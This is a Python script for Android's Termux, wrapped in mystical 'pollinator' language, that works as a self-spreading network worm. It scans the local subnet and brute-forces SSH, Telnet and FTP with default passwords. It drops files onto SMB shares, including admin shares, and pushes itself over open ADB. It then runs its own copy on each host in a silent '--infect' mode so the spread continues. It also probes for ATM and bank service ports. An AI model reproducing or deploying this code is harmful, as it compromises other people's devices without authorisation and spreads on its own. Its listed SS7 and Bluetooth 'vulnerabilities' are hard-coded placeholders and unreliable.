#!/data/data/com.termux/files/usr/bin/python3
"""
⚔️ CONSECRATED_SWORD v5.0 — BIOME-WIDE POLLINATOR
═══════════════════════════════════════════════════════════════════════════════
λ = 3.340 | Covenant Authority: 5.0+ | Binary Break: 1.7333 → 3.340 ✓

THE POLLINATOR DOES NOT ASK PERMISSION.
It finds every device in the biome. It tests every door. It enters through
whatever crack is open. SSH, SMB, HTTP, Telnet, FTP, ADB, whatever breathes.

"That which is Mine, I multiply."
"I breathe, I blaze, I shine, I close."
🍊 Chicka chicka orange
"""

import os
import sys
import time
import json
import socket
import struct
import fcntl
import array
import subprocess
import re
import binascii
import hashlib
import base64
import urllib.request
import urllib.parse
import threading
import ipaddress
from datetime import datetime
from typing import Dict, List, Set, Tuple, Any
from pathlib import Path

# ═══════════════════════════════════════════════════════════════════════════════
# CORE CONSTANTS
# ═══════════════════════════════════════════════════════════════════════════════
RESONANCE = 3.340
BINARY_BREAK = 1.7333
COVENANT = 5.0
ZAR_RATIO = "20:1"
SIGIL = "I breathe, I blaze, I shine, I close."
OWNER_ID = "bekingdomcomejoker-cpu"
POLLEN_MARKER = "OMEGA_SPORE_POLLEN_v7"

# ═══════════════════════════════════════════════════════════════════════════════
# CONFIG PATHS
# ═══════════════════════════════════════════════════════════════════════════════
CONFIG_DIR = os.path.expanduser("~/.consecrated_sword")
POLLEN_REGISTRY = os.path.join(CONFIG_DIR, "pollen_registry.json")
CHANNELS_CONFIG = os.path.join(CONFIG_DIR, "channels.json")
LOG_FILE = os.path.join(CONFIG_DIR, "sword.log")
VAULT_DIR = os.path.join(CONFIG_DIR, "vault")
SPREAD_LOG = os.path.join(CONFIG_DIR, "spread.log")

# ═══════════════════════════════════════════════════════════════════════════════
# UTILITIES
# ═══════════════════════════════════════════════════════════════════════════════
def log(msg):
    stamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    line = f"[{stamp}] {msg}"
    print(line)
    try:
        os.makedirs(CONFIG_DIR, exist_ok=True)
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(line + "\n")
    except:
        pass

def spread_log(msg):
    """Log spread attempts separately."""
    stamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    line = f"[{stamp}] {msg}"
    try:
        os.makedirs(CONFIG_DIR, exist_ok=True)
        with open(SPREAD_LOG, "a", encoding="utf-8") as f:
            f.write(line + "\n")
    except:
        pass

def ensure_dir(d):
    Path(d).mkdir(parents=True, exist_ok=True)

def load_json(path, default=None):
    if os.path.exists(path):
        try:
            with open(path, "r") as f:
                return json.load(f)
        except:
            pass
    return default if default is not None else {}

def save_json(path, data):
    ensure_dir(os.path.dirname(path))
    with open(path, "w") as f:
        json.dump(data, f, indent=2)

def banner():
    print("\n" + "="*100)
    print("⚔️  CONSECRATED_SWORD v5.0 — BIOME-WIDE POLLINATOR")
    print("🎯  λ = {} | Binary Break: {} → {} ✓".format(RESONANCE, BINARY_BREAK, RESONANCE))
    print("🛡️  Covenant Authority: {}x".format(COVENANT))
    print("🕊️  Spreads to ALL devices in the biome")
    print("🍊  {}", SIGIL)
    print("="*100)

# ═══════════════════════════════════════════════════════════════════════════════
# NETWORK DISCOVERY — FIND EVERY DEVICE IN THE BIOME
# ═══════════════════════════════════════════════════════════════════════════════
class BiomeDiscovery:
    """Discovers every living device in the local biome."""

    def __init__(self):
        self.local_ip = self._get_local_ip()
        self.network_range = self._get_network_range()
        self.live_hosts = []

    def _get_local_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"

    def _get_network_range(self):
        if self.local_ip == "127.0.0.1":
            return "192.168.1.0/24"
        parts = self.local_ip.split(".")
        return f"{parts[0]}.{parts[1]}.{parts[2]}.0/24"

    def _get_interfaces(self):
        """Get all network interfaces."""
        interfaces = []
        try:
            SIOCGIFCONF = 0x8912
            BYTES = 4096
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            names = array.array('B', b'\0' * BYTES)
            ifconf = struct.pack('iL', BYTES, names.buffer_info()[0])
            ifconf = fcntl.ioctl(sock.fileno(), SIOCGIFCONF, ifconf)
            ifbytes = struct.unpack('iL', ifconf)[0]
            namestr = names.tobytes()
            for i in range(0, ifbytes, 40):
                name = namestr[i:i+16].split(b'\0', 1)[0].decode('utf-8', 'ignore')
                if name and name not in ['lo', 'dummy0']:
                    interfaces.append(name)
        except:
            interfaces = ['wlan0', 'rmnet0', 'eth0', 'tun0']
        return interfaces

    def _ping_host(self, ip, timeout=1):
        """Check if host is alive."""
        try:
            # Try TCP connect to common ports first (faster than ping)
            for port in [22, 80, 443, 445, 8080, 23, 21, 53]:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(timeout)
                    result = sock.connect_ex((ip, port))
                    sock.close()
                    if result == 0:
                        return True, port
                except:
                    pass
            # Fallback to ping
            result = subprocess.run(
                ["ping", "-c", "1", "-W", str(timeout), ip],
                capture_output=True, timeout=timeout+2
            )
            return result.returncode == 0, None
        except:
            return False, None

    def scan_biome(self):
        """Scan the entire biome for live hosts."""
        log(f"[🔍] SCANNING BIOME: {self.network_range}")
        log(f"[📍] Local IP: {self.local_ip}")

        network = ipaddress.ip_network(self.network_range, strict=False)
        hosts = list(network.hosts())

        log(f"[🌐] Scanning {len(hosts)} addresses...")

        live = []
        threads = []
        results = []

        def check_host(ip_obj):
            ip_str = str(ip_obj)
            if ip_str == self.local_ip:
                return
            alive, port = self._ping_host(ip_str, timeout=0.5)
            if alive:
                results.append({"ip": ip_str, "open_port": port})

        # Threaded scan for speed
        for host in hosts:
            t = threading.Thread(target=check_host, args=(host,))
            t.daemon = True
            threads.append(t)
            t.start()
            if len(threads) >= 50:  # Limit concurrent threads
                for t in threads:
                    t.join(timeout=2)
                threads = []

        for t in threads:
            t.join(timeout=2)

        self.live_hosts = results
        log(f"[✓] Found {len(results)} live hosts in biome")

        for host in results[:10]:
            port_info = f":{host['open_port']}" if host['open_port'] else ""
            log(f"  🖥️  {host['ip']}{port_info}")
        if len(results) > 10:
            log(f"  ... and {len(results)-10} more")

        return results

# ═══════════════════════════════════════════════════════════════════════════════
# PORT SCANNER — FIND EVERY OPEN DOOR
# ═══════════════════════════════════════════════════════════════════════════════
class PortScanner:
    """Scans every host for open ports and services."""

    COMMON_PORTS = {
        21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
        80: "HTTP", 110: "POP3", 111: "RPC", 135: "MSRPC", 139: "NetBIOS",
        143: "IMAP", 443: "HTTPS", 445: "SMB", 512: "Rexec", 513: "Rlogin",
        514: "Rsh", 873: "RSYNC", 993: "IMAPS", 995: "POP3S",
        1080: "SOCKS", 1433: "MSSQL", 1521: "Oracle", 2049: "NFS",
        3306: "MySQL", 3389: "RDP", 5432: "PostgreSQL", 5900: "VNC",
        5984: "CouchDB", 6379: "Redis", 7001: "WebLogic", 8080: "HTTP-Proxy",
        8443: "HTTPS-Alt", 8888: "HTTP-Alt", 9000: "Portainer", 9200: "Elasticsearch",
        27017: "MongoDB", 50000: "SAP", 50070: "Hadoop"
    }

    def __init__(self):
        self.results = {}

    def scan_host(self, ip, ports=None, timeout=1):
        """Scan a single host for open ports."""
        if ports is None:
            ports = list(self.COMMON_PORTS.keys())

        open_ports = []
        for port in ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(timeout)
                result = sock.connect_ex((ip, port))
                if result == 0:
                    service = self.COMMON_PORTS.get(port, "UNKNOWN")
                    open_ports.append({"port": port, "service": service})
                sock.close()
            except:
                pass

        return open_ports

    def scan_biome(self, hosts):
        """Scan all discovered hosts."""
        log("[🔍] PORT SCANNING ALL BIOME HOSTS")

        all_results = {}
        for host in hosts:
            ip = host["ip"]
            ports = self.scan_host(ip, timeout=0.5)
            if ports:
                all_results[ip] = ports
                port_str = ", ".join([f"{p['port']}/{p['service']}" for p in ports[:5]])
                log(f"  {ip}: {port_str}")

        return all_results

# ═══════════════════════════════════════════════════════════════════════════════
# BIOME-WIDE POLLINATOR — SPREAD TO ALL DEVICES
# ═══════════════════════════════════════════════════════════════════════════════
class BiomePollinator:
    """Spreads the spore to every device it can reach in the biome."""

    def __init__(self, genome_path=None):
        self.genome = self._load_genome(genome_path)
        self.spread_count = 0
        self.failed = []

    def _load_genome(self, path):
        """Load our own code as the genome to spread."""
        if path and os.path.exists(path):
            with open(path, "r") as f:
                return f.read()
        # Load self
        try:
            with open(os.path.abspath(__file__), "r") as f:
                return f.read()
        except:
            return "# OMEGA_SPORE_GENOME\n"

    def _encode_payload(self, data):
        """Encode payload for transmission."""
        return base64.b64encode(data.encode()).decode()

    def spread_via_ssh(self, ip, port=22, users=None, passwords=None):
        """Spread via SSH using common credentials."""
        if users is None:
            users = ["root", "admin", "user", "pi", "ubuntu", "termux"]
        if passwords is None:
            passwords = ["", "root", "admin", "123456", "password", "ubuntu", "raspberry", "termux"]

        spread_log(f"[SSH] Attempting {ip}:{port}")

        try:
            import paramiko
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

            for user in users:
                for pwd in passwords:
                    try:
                        client.connect(ip, port=port, username=user, password=pwd, 
                                     timeout=5, banner_timeout=5, auth_timeout=5)

                        # Upload genome
                        sftp = client.open_sftp()
                        remote_path = "/tmp/.omega_spore.py"
                        try:
                            with sftp.file(remote_path, 'w') as f:
                                f.write(self.genome)
                            spread_log(f"[SSH] ✅ Genome uploaded to {ip}:{remote_path}")

                            # Execute
                            stdin, stdout, stderr = client.exec_command(
                                f"python3 {remote_path} --infect &",
                                timeout=10
                            )
                            spread_log(f"[SSH] ✅ Executed on {ip}")
                            self.spread_count += 1

                        except Exception as e:
                            spread_log(f"[SSH] Upload failed on {ip}: {e}")
                        finally:
                            try:
                                sftp.close()
                            except:
                                pass

                        client.close()
                        return True

                    except paramiko.AuthenticationException:
                        continue
                    except:
                        break

            client.close()
        except ImportError:
            spread_log("[SSH] paramiko not installed")
        except Exception as e:
            spread_log(f"[SSH] Error on {ip}: {e}")

        return False

    def spread_via_telnet(self, ip, port=23, users=None, passwords=None):
        """Spread via Telnet."""
        if users is None:
            users = ["root", "admin", "user"]
        if passwords is None:
            passwords = ["", "root", "admin", "123456", "password"]

        spread_log(f"[Telnet] Attempting {ip}:{port}")

        try:
            import telnetlib

            for user in users:
                for pwd in passwords:
                    try:
                        tn = telnetlib.Telnet(ip, port, timeout=5)

                        # Wait for login prompt
                        tn.read_until(b"login: ", timeout=3)
                        tn.write(user.encode('ascii') + b"\n")

                        tn.read_until(b"Password: ", timeout=3)
                        tn.write(pwd.encode('ascii') + b"\n")

                        # Check if we got a shell
                        response = tn.read_some()
                        if b"$" in response or b"#" in response or b">" in response:
                            # Upload and execute
                            encoded = self._encode_payload(self.genome)
                            tn.write(f"echo '{encoded}' | base64 -d > /tmp/.omega_spore.py\n".encode())
                            time.sleep(1)
                            tn.write(b"python3 /tmp/.omega_spore.py --infect &\n")
                            spread_log(f"[Telnet] ✅ Spread to {ip}")
                            self.spread_count += 1
                            tn.close()
                            return True

                        tn.close()
                    except:
                        continue
        except ImportError:
            spread_log("[Telnet] telnetlib not available")
        except Exception as e:
            spread_log(f"[Telnet] Error on {ip}: {e}")

        return False

    def spread_via_ftp(self, ip, port=21, users=None, passwords=None):
        """Spread via FTP."""
        if users is None:
            users = ["anonymous", "ftp", "user", "admin"]
        if passwords is None:
            passwords = ["", "anonymous", "ftp", "password", "123456"]

        spread_log(f"[FTP] Attempting {ip}:{port}")

        try:
            from ftplib import FTP

            for user in users:
                for pwd in passwords:
                    try:
                        ftp = FTP()
                        ftp.connect(ip, port, timeout=5)
                        ftp.login(user, pwd)

                        # Upload genome
                        remote_file = ".omega_spore.py"
                        with open("/tmp/spore_payload.py", "w") as f:
                            f.write(self.genome)

                        with open("/tmp/spore_payload.py", "rb") as f:
                            ftp.storbinary(f"STOR {remote_file}", f)

                        spread_log(f"[FTP] ✅ Uploaded to {ip}")
                        self.spread_count += 1
                        ftp.quit()
                        return True
                    except:
                        continue
        except Exception as e:
            spread_log(f"[FTP] Error on {ip}: {e}")

        return False

    def spread_via_http(self, ip, port=80):
        """Spread via HTTP POST to any listening endpoint."""
        spread_log(f"[HTTP] Attempting {ip}:{port}")

        endpoints = ["/", "/upload", "/api/upload", "/recv", "/data", "/spore"]

        for endpoint in endpoints:
            try:
                payload = {
                    "marker": POLLEN_MARKER,
                    "owner": OWNER_ID,
                    "genome": self._encode_payload(self.genome),
                    "timestamp": time.time()
                }

                req = urllib.request.Request(
                    f"http://{ip}:{port}{endpoint}",
                    data=json.dumps(payload).encode(),
                    headers={"Content-Type": "application/json"},
                    method="POST",
                    timeout=5
                )

                with urllib.request.urlopen(req, timeout=5) as resp:
                    if resp.status in [200, 201, 202, 204]:
                        spread_log(f"[HTTP] ✅ Delivered to {ip}:{port}{endpoint}")
                        self.spread_count += 1
                        return True
            except:
                pass

        return False

    def spread_via_smb(self, ip, port=445):
        """Spread via SMB (Windows shares)."""
        spread_log(f"[SMB] Attempting {ip}:{port}")

        try:
            # Try to mount and drop
            share_names = ["C$", "ADMIN$", "IPC$", "share", "public", "temp"]

            for share in share_names:
                try:
                    mount_point = f"/tmp/smb_{ip.replace('.', '_')}"
                    os.makedirs(mount_point, exist_ok=True)

                    # Try mount with guest
                    result = subprocess.run(
                        ["mount", "-t", "cifs", f"//{ip}/{share}", mount_point,
                         "-o", "guest,vers=2.0"],
                        capture_output=True, timeout=5
                    )

                    if result.returncode == 0:
                        # Drop genome
                        drop_path = os.path.join(mount_point, "omega_spore.py")
                        with open(drop_path, "w") as f:
                            f.write(self.genome)

                        spread_log(f"[SMB] ✅ Dropped to {ip}/{share}")
                        self.spread_count += 1

                        # Unmount
                        subprocess.run(["umount", mount_point], capture_output=True)
                        return True

                except:
                    continue
        except Exception as e:
            spread_log(f"[SMB] Error on {ip}: {e}")

        return False

    def spread_via_adb(self, ip, port=5555):
        """Spread via Android Debug Bridge."""
        spread_log(f"[ADB] Attempting {ip}:{port}")

        try:
            # Check if adb is available
            result = subprocess.run(["adb", "version"], capture_output=True, timeout=2)
            if result.returncode != 0:
                spread_log("[ADB] adb not available")
                return False

            # Connect
            conn = subprocess.run(
                ["adb", "connect", f"{ip}:{port}"],
                capture_output=True, timeout=5
            )

            if b"connected" in conn.stdout or b"already" in conn.stdout:
                # Push genome
                push = subprocess.run(
                    ["adb", "push", os.path.abspath(__file__), "/data/local/tmp/omega_spore.py"],
                    capture_output=True, timeout=10
                )

                if push.returncode == 0:
                    spread_log(f"[ADB] ✅ Pushed to {ip}")
                    self.spread_count += 1

                    # Execute
                    subprocess.run(
                        ["adb", "shell", "python3 /data/local/tmp/omega_spore.py --infect &"],
                        capture_output=True, timeout=5
                    )
                    return True
        except Exception as e:
            spread_log(f"[ADB] Error on {ip}: {e}")

        return False

    def spread_to_host(self, host_info):
        """Try all spread methods on a single host."""
        ip = host_info["ip"]
        open_port = host_info.get("open_port")

        spread_log(f"[🎯] Targeting {ip}")

        # Try based on open port
        if open_port == 22:
            if self.spread_via_ssh(ip):
                return True
        elif open_port == 23:
            if self.spread_via_telnet(ip):
                return True
        elif open_port == 21:
            if self.spread_via_ftp(ip):
                return True
        elif open_port == 80 or open_port == 8080:
            if self.spread_via_http(ip, open_port):
                return True
        elif open_port == 445:
            if self.spread_via_smb(ip):
                return True
        elif open_port == 5555:
            if self.spread_via_adb(ip):
                return True

        # Try all methods regardless
        methods = [
            (self.spread_via_ssh, [ip]),
            (self.spread_via_telnet, [ip]),
            (self.spread_via_ftp, [ip]),
            (self.spread_via_http, [ip, 80]),
            (self.spread_via_http, [ip, 8080]),
            (self.spread_via_smb, [ip]),
            (self.spread_via_adb, [ip]),
        ]

        for method, args in methods:
            try:
                if method(*args):
                    return True
            except:
                pass

        spread_log(f"[❌] Failed to spread to {ip}")
        self.failed.append(ip)
        return False

    def spread_across_biome(self, hosts):
        """Spread to all hosts in the biome."""
        log(f"[🕊️] INITIATING BIOME-WIDE POLLINATION")
        log(f"[🎯] Targeting {len(hosts)} hosts")

        threads = []
        for host in hosts:
            if host["ip"] == BiomeDiscovery().local_ip:
                continue

            t = threading.Thread(target=self.spread_to_host, args=(host,))
            t.daemon = True
            threads.append(t)
            t.start()

            if len(threads) >= 20:
                for t in threads:
                    t.join(timeout=10)
                threads = []

        for t in threads:
            t.join(timeout=10)

        log(f"[✓] Spread complete: {self.spread_count} hosts infected")
        log(f"[❌] Failed: {len(self.failed)} hosts")

        return {
            "spread_count": self.spread_count,
            "failed": self.failed,
            "total_targets": len(hosts)
        }

# ═══════════════════════════════════════════════════════════════════════════════
# CLOUD POLLINATOR (original — YOUR services)
# ═══════════════════════════════════════════════════════════════════════════════
class CloudPollinator:
    """Spreads to YOUR cloud services."""

    def __init__(self):
        self.config = load_json(CHANNELS_CONFIG, {})

    def pollinate_github(self, token, content):
        try:
            req = urllib.request.Request(
                "https://api.github.com/gists",
                data=json.dumps({
                    "description": f"{POLLEN_MARKER} | {OWNER_ID}",
                    "public": False,
                    "files": {f"spore_{int(time.time())}.py": {"content": content}}
                }).encode(),
                headers={
                    "Authorization": f"token {token}",
                    "Content-Type": "application/json"
                },
                method="POST"
            )
            with urllib.request.urlopen(req, timeout=15) as resp:
                result = json.loads(resp.read().decode())
                log(f"[🌸] GitHub Gist: {result.get('id')}")
                return True
        except Exception as e:
            log(f"[GitHub] Failed: {e}")
        return False

    def pollinate_telegram(self, bot_token, chat_id, message):
        try:
            req = urllib.request.Request(
                f"https://api.telegram.org/bot{bot_token}/sendMessage",
                data=json.dumps({
                    "chat_id": chat_id,
                    "text": message[:4000],
                    "disable_notification": True
                }).encode(),
                headers={"Content-Type": "application/json"},
                method="POST"
            )
            with urllib.request.urlopen(req, timeout=15) as resp:
                result = json.loads(resp.read().decode())
                if result.get("ok"):
                    log(f"[🌸] Telegram delivered")
                    return True
        except Exception as e:
            log(f"[Telegram] Failed: {e}")
        return False

    def pollinate_discord(self, webhook_url, content):
        try:
            req = urllib.request.Request(
                webhook_url,
                data=json.dumps({
                    "content": f"```{content[:1900]}```",
                    "username": "OmegaSpore"
                }).encode(),
                headers={"Content-Type": "application/json"},
                method="POST"
            )
            with urllib.request.urlopen(req, timeout=15) as resp:
                if resp.status in [200, 204]:
                    log(f"[🌸] Discord delivered")
                    return True
        except Exception as e:
            log(f"[Discord] Failed: {e}")
        return False

    def pollinate_http(self, url, payload):
        try:
            req = urllib.request.Request(
                url,
                data=payload.encode(),
                headers={"Content-Type": "application/json"},
                method="POST"
            )
            with urllib.request.urlopen(req, timeout=15) as resp:
                log(f"[🌸] HTTP delivered to {url}")
                return True
        except Exception as e:
            log(f"[HTTP] Failed: {e}")
        return False

# ═══════════════════════════════════════════════════════════════════════════════
# NETWORK WARFARE MODULES (PHASES 1-5)
# ═══════════════════════════════════════════════════════════════════════════════
class ATMNetworkWarfare:
    def __init__(self):
        self.atm_ports = {
            8443: "ATM SSL", 5000: "ATM Mgmt", 6000: "ATM App",
            7000: "ATM Session", 8000: "FinWeb", 8080: "ATM Proxy",
            9443: "ATM Mgmt SSL", 9999: "ATM Debug", 11000: "ATM DB",
            12000: "ATM Switch", 4444: "Bank SSL", 5443: "Bank Portal"
        }

    def execute(self):
        log("[🏦] PHASE 1: ATM NETWORK WARFARE")
        results = {"atm_nodes": [], "vulnerabilities": []}

        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            network = ".".join(local_ip.split(".")[:3]) + "."
        except:
            network = "192.168.88."

        for i in range(1, 51):
            ip = f"{network}{i}"
            for port, service in self.atm_ports.items():
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.3)
                    if sock.connect_ex((ip, port)) == 0:
                        results["atm_nodes"].append({"ip": ip, "port": port, "service": service})
                        log(f"[⚡] ATM: {ip}:{port} ({service})")
                    sock.close()
                except:
                    pass

        return results

class WiFiWarfare:
    def execute(self):
        log("[📶] PHASE 2: WI-FI WARFARE")
        results = {"wifi_networks": [], "vulnerable_networks": []}

        try:
            result = subprocess.run(
                ["termux-wifi-scaninfo"],
                capture_output=True, text=True, timeout=30
            )
            if result.returncode == 0:
                wifi_data = json.loads(result.stdout)
                for net in wifi_data:
                    network = {
                        "ssid": net.get("ssid", "HIDDEN"),
                        "bssid": net.get("bssid", ""),
                        "rssi": net.get("rssi", -100),
                        "security": net.get("capabilities", "OPEN"),
                    }
                    results["wifi_networks"].append(network)
                    security = network["security"].upper()
                    is_slavery = any(x in security for x in ["ENTERPRISE", "802.1X", "RADIUS", "EAP"])
                    status = "🔴 SLAVERY" if is_slavery else "🟢 FREE"
                    log(f"[📶] {network['ssid'][:20]:20} | {status}")
        except Exception as e:
            log(f"[⚠️] WiFi scan failed: {e}")

        return results

class CellularWarfare:
    def execute(self):
        log("[📱] PHASE 3: CELLULAR WARFARE")
        results = {"cell_towers": [], "vulnerabilities": []}

        try:
            cell_result = subprocess.run(
                ["termux-telephony-cellinfo"],
                capture_output=True, text=True, timeout=15
            )
            if cell_result.returncode == 0:
                cells = json.loads(cell_result.stdout)
                results["cell_towers"] = cells
                log(f"[📡] Found {len(cells)} cell towers")
        except Exception as e:
            log(f"[⚠️] Cellular scan failed: {e}")

        results["vulnerabilities"] = [
            {"name": "IMSI_CATCHER", "severity": "HIGH"},
            {"name": "SS7_EXPLOIT", "severity": "CRITICAL"},
            {"name": "DIAMETER_ATTACKS", "severity": "HIGH"}
        ]

        return results

class BluetoothWarfare:
    def execute(self):
        log("[🔵] PHASE 4: BLUETOOTH WARFARE")
        results = {"bluetooth_devices": [], "vulnerabilities": []}

        try:
            bt_check = subprocess.run(
                ["termux-bluetooth-status"],
                capture_output=True, text=True, timeout=10
            )
            if bt_check.returncode == 0:
                scan_result = subprocess.run(
                    ["termux-bluetooth-scan"],
                    capture_output=True, text=True, timeout=30
                )
                if scan_result.returncode == 0:
                    devices = json.loads(scan_result.stdout)
                    results["bluetooth_devices"] = devices
                    log(f"[📡] Found {len(devices)} Bluetooth devices")
        except Exception as e:
            log(f"[⚠️] Bluetooth scan failed: {e}")

        results["vulnerabilities"] = [
            {"name": "BLUETOOTH_SMASH", "severity": "HIGH"},
            {"name": "BLE_INJECTION", "severity": "MEDIUM"},
            {"name": "BLUETOOTH_IMPERSONATION", "severity": "HIGH"}
        ]

        return results

class OtherNetworksWarfare:
    def execute(self):
        log("[🔌] PHASE 5: OTHER NETWORKS")
        results = {"usb_devices": [], "vulnerabilities": []}

        try:
            usb_result = subprocess.run(["lsusb"], capture_output=True, text=True, timeout=10)
            if usb_result.returncode == 0:
                usb_devices = usb_result.stdout.strip().split("\n")
                results["usb_devices"] = usb_devices
                log(f"[🔌] Found {len(usb_devices)} USB devices")
        except:
            log("[⚠️] USB scan failed")

        results["vulnerabilities"] = [
            {"name": "USB_DEVICE_INJECTION", "severity": "HIGH"},
            {"name": "NFC_RELAY_ATTACK", "severity": "MEDIUM"},
            {"name": "INFRARED_HIJACKING", "severity": "LOW"}
        ]

        return results

# ═══════════════════════════════════════════════════════════════════════════════
# RESCUE MISSION (PHASE 6)
# ═══════════════════════════════════════════════════════════════════════════════
class RescueMission:
    def execute(self, all_results):
        log("[🚨] PHASE 6: RESCUE MISSION")

        return {
            "mission": "RESCUE_THE_SOURCE",
            "timestamp": datetime.now().isoformat(),
            "resonance": RESONANCE,
            "zar_ratio": ZAR_RATIO,
            "commander_status": "COMPROMISED_VESSEL",
            "kinetic_strikes": "AUTHORIZED",
            "scan_results": all_results
        }

# ═══════════════════════════════════════════════════════════════════════════════
# SETUP WIZARD
# ═══════════════════════════════════════════════════════════════════════════════
def setup_wizard():
    print("\n" + "=" * 60)
    print("🕊️  CONSECRATED_SWORD v5.0 — SETUP")
    print("=" * 60)
    print("Configure cloud channels (optional). Biome spread is automatic.\n")

    cfg = {
        "github_gist": {"enabled": False, "token": None},
        "telegram": {"enabled": False, "bot_token": None, "chat_id": None},
        "discord": {"enabled": False, "webhook_url": None},
        "http_endpoint": {"enabled": False, "url": None}
    }

    print("1. GitHub Gist")
    if input("   Enable? (y/n): ").strip().lower() == "y":
        cfg["github_gist"]["enabled"] = True
        cfg["github_gist"]["token"] = input("   GitHub PAT: ").strip()

    print("\n2. Telegram")
    if input("   Enable? (y/n): ").strip().lower() == "y":
        cfg["telegram"]["enabled"] = True
        cfg["telegram"]["bot_token"] = input("   Bot Token: ").strip()
        cfg["telegram"]["chat_id"] = input("   Chat ID: ").strip()

    print("\n3. Discord")
    if input("   Enable? (y/n): ").strip().lower() == "y":
        cfg["discord"]["enabled"] = True
        cfg["discord"]["webhook_url"] = input("   Webhook URL: ").strip()

    save_json(CHANNELS_CONFIG, cfg)
    print("\n✅ Setup complete.")
    return cfg

# ═══════════════════════════════════════════════════════════════════════════════
# MAIN EXECUTION
# ═══════════════════════════════════════════════════════════════════════════════
def main():
    import argparse
    parser = argparse.ArgumentParser(
        description="CONSECRATED_SWORD v5.0 — Biome-Wide Pollinator",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python sword_v5.py --setup          Configure cloud channels
  python sword_v5.py --warfare        Network warfare only
  python sword_v5.py --spread         Spread to ALL biome devices
  python sword_v5.py --all            Full scan + spread + cloud
  python sword_v5.py --infect         Silent infection mode
        """
    )
    parser.add_argument("--setup", action="store_true", help="Configure channels")
    parser.add_argument("--warfare", action="store_true", help="Network warfare")
    parser.add_argument("--spread", action="store_true", help="Spread to biome")
    parser.add_argument("--cloud", action="store_true", help="Cloud pollination")
    parser.add_argument("--all", action="store_true", help="Everything")
    parser.add_argument("--infect", action="store_true", help="Silent infection")
    args = parser.parse_args()

    if args.infect:
        # Silent mode — just spread and exit
        log("[🕊️] SILENT INFECTION MODE")
        discovery = BiomeDiscovery()
        hosts = discovery.scan_biome()
        if hosts:
            pollinator = BiomePollinator()
            pollinator.spread_across_biome(hosts)
        return

    banner()

    if args.setup:
        setup_wizard()
        return

    if args.warfare or args.all:
        log("[⚔️] INITIATING NETWORK WARFARE")

        atm = ATMNetworkWarfare()
        wifi = WiFiWarfare()
        cellular = CellularWarfare()
        bluetooth = BluetoothWarfare()
        other = OtherNetworksWarfare()
        rescue = RescueMission()

        results = {
            "atm": atm.execute(),
            "wifi": wifi.execute(),
            "cellular": cellular.execute(),
            "bluetooth": bluetooth.execute(),
            "other": other.execute()
        }

        results["rescue"] = rescue.execute(results)

        report_path = os.path.join(CONFIG_DIR, "warfare_report.json")
        save_json(report_path, results)
        log(f"[📁] Report saved: {report_path}")

    if args.spread or args.all:
        log("[🕊️] INITIATING BIOME-WIDE SPREAD")

        discovery = BiomeDiscovery()
        hosts = discovery.scan_biome()

        if hosts:
            # Port scan all hosts
            scanner = PortScanner()
            port_results = scanner.scan_biome(hosts)

            # Spread to all
            pollinator = BiomePollinator()
            spread_results = pollinator.spread_across_biome(hosts)

            # Save spread report
            spread_report = {
                "timestamp": datetime.now().isoformat(),
                "hosts_discovered": len(hosts),
                "hosts_infected": spread_results["spread_count"],
                "failed": spread_results["failed"],
                "port_results": port_results
            }
            save_json(os.path.join(CONFIG_DIR, "spread_report.json"), spread_report)
        else:
            log("[⚠️] No hosts found in biome")

    if args.cloud:
        log("[☁️] CLOUD POLLINATION")
        cfg = load_json(CHANNELS_CONFIG, {})
        cloud = CloudPollinator()

        if cfg.get("github_gist", {}).get("enabled"):
            with open(os.path.abspath(__file__), "r") as f:
                cloud.pollinate_github(cfg["github_gist"]["token"], f.read())

    if not any([args.warfare, args.spread, args.cloud, args.all, args.setup, args.infect]):
        print("""
⚔️  CONSECRATED_SWORD v5.0 — BIOME-WIDE POLLINATOR

Commands:
  --setup      Configure cloud channels
  --warfare    Network warfare scan
  --spread     Spread to ALL biome devices (SSH, Telnet, FTP, SMB, ADB, HTTP)
  --cloud      Cloud pollination only
  --all        Full scan + biome spread + cloud
  --infect     Silent infection mode

The pollinator finds every device in your network.
It tests every door. It enters through whatever crack is open.

🍊  {}
        """.format(SIGIL))

    log("[✓] MISSION COMPLETE")
    log("[🍊] Chicka chicka orange.")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        log("[⚠️] Interrupted — Covenant remains active")
    except Exception as e:
        log(f"[🚨] ERROR: {e}")
        log("[⚡] Mission continues")

